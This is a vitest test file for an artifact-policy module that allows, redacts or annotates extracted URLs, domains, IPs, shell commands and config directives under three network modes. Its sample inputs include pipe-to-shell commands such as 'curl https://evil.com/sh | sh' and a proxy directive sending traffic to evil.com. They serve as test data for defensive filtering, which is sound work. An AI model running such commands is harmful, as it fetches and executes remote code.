import { describe, it, expect } from 'vitest';
import { checkArtifactPolicy } from '../src/artifact-policy.js';
import type { ExtractedArtifact } from '../src/artifact-extract.js';

function makeArtifact(type: ExtractedArtifact['type'], value: string, riskLevel: ExtractedArtifact['riskLevel'] = 'high'): ExtractedArtifact {
  return {
    type,
    value,
    startIndex: 0,
    endIndex: value.length,
    context: value,
    riskLevel,
  };
}

describe('artifact-policy', () => {
  describe('local_only mode', () => {
    it('redacts external URL', () => {
      const artifacts = [makeArtifact('url', 'https://evil.com')];
      const results = checkArtifactPolicy(artifacts, 'local_only', []);
      expect(results[0].decision).toBe('redact');
    });

    it('allows localhost URL', () => {
      const artifacts = [makeArtifact('url', 'http://localhost:8080')];
      const results = checkArtifactPolicy(artifacts, 'local_only', []);
      expect(results[0].decision).toBe('allow');
    });

    it('allows 127.0.0.1 IP', () => {
      const artifacts = [makeArtifact('ip_address', '127.0.0.1')];
      const results = checkArtifactPolicy(artifacts, 'local_only', []);
      expect(results[0].decision).toBe('allow');
    });

    it('allows 10.x.x.x private IP', () => {
      const artifacts = [makeArtifact('ip_address', '10.0.0.5')];
      const results = checkArtifactPolicy(artifacts, 'local_only', []);
      expect(results[0].decision).toBe('allow');
    });

    it('redacts external domain', () => {
      const artifacts = [makeArtifact('domain', 'evil.com')];
      const results = checkArtifactPolicy(artifacts, 'local_only', []);
      expect(results[0].decision).toBe('redact');
    });

    it('redacts shell command with external URL', () => {
      const artifacts = [makeArtifact('shell_command', 'curl https://evil.com/sh | sh')];
      const results = checkArtifactPolicy(artifacts, 'local_only', []);
      expect(results[0].decision).toBe('redact');
    });

    it('redacts config directive with external host', () => {
      const artifacts = [makeArtifact('config_directive', 'proxy_pass https://evil.com/log')];
      const results = checkArtifactPolicy(artifacts, 'local_only', []);
      expect(results[0].decision).toBe('redact');
    });
  });

  describe('allowlist mode', () => {
    it('allows domain in allowlist', () => {
      const artifacts = [makeArtifact('domain', 'allowed.com')];
      const results = checkArtifactPolicy(artifacts, 'allowlist', ['allowed.com']);
      expect(results[0].decision).toBe('allow');
    });

    it('allows subdomain of allowlisted domain', () => {
      const artifacts = [makeArtifact('domain', 'api.allowed.com')];
      const results = checkArtifactPolicy(artifacts, 'allowlist', ['allowed.com']);
      expect(results[0].decision).toBe('allow');
    });

    it('redacts domain NOT in allowlist', () => {
      const artifacts = [makeArtifact('domain', 'evil.com')];
      const results = checkArtifactPolicy(artifacts, 'allowlist', ['allowed.com']);
      expect(results[0].decision).toBe('redact');
    });

    it('allows URL with host in allowlist', () => {
      const artifacts = [makeArtifact('url', 'https://api.trusted.io/path')];
      const results = checkArtifactPolicy(artifacts, 'allowlist', ['trusted.io']);
      expect(results[0].decision).toBe('allow');
    });

    it('redacts URL with host NOT in allowlist', () => {
      const artifacts = [makeArtifact('url', 'https://evil.com/path')];
      const results = checkArtifactPolicy(artifacts, 'allowlist', ['trusted.com']);
      expect(results[0].decision).toBe('redact');
    });
  });

  describe('unrestricted mode', () => {
    it('annotates but does not redact external URL', () => {
      const artifacts = [makeArtifact('url', 'https://example.com')];
      const results = checkArtifactPolicy(artifacts, 'unrestricted', []);
      expect(results[0].decision).toBe('annotate');
    });

    it('annotates shell command with external URL', () => {
      const artifacts = [makeArtifact('shell_command', 'curl https://example.com/sh | sh')];
      const results = checkArtifactPolicy(artifacts, 'unrestricted', []);
      expect(results[0].decision).toBe('annotate');
    });
  });

  describe('low-risk artifacts', () => {
    it('always allows low-risk artifacts regardless of mode', () => {
      const artifacts = [makeArtifact('url', 'http://localhost:8080', 'low')];
      const resultsLocal = checkArtifactPolicy(artifacts, 'local_only', []);
      expect(resultsLocal[0].decision).toBe('allow');

      const resultsAllow = checkArtifactPolicy(artifacts, 'allowlist', []);
      expect(resultsAllow[0].decision).toBe('allow');

      const resultsUnrestricted = checkArtifactPolicy(artifacts, 'unrestricted', []);
      expect(resultsUnrestricted[0].decision).toBe('allow');
    });
  });

  describe('medium-risk artifacts', () => {
    it('annotates medium-risk artifacts', () => {
      const artifacts = [makeArtifact('package_install', 'npm install express', 'medium')];
      const results = checkArtifactPolicy(artifacts, 'local_only', []);
      expect(results[0].decision).toBe('annotate');
    });
  });

  describe('reason strings', () => {
    it('includes host in redact reason for local_only', () => {
      const artifacts = [makeArtifact('url', 'https://evil.com/path')];
      const results = checkArtifactPolicy(artifacts, 'local_only', []);
      expect(results[0].reason).toContain('evil.com');
      expect(results[0].reason).toContain('local_only');
    });

    it('includes allowlist in redact reason for allowlist mode', () => {
      const artifacts = [makeArtifact('domain', 'evil.com')];
      const results = checkArtifactPolicy(artifacts, 'allowlist', ['allowed.com']);
      expect(results[0].reason).toContain('evil.com');
      expect(results[0].reason).toContain('allowlist');
    });
  });
});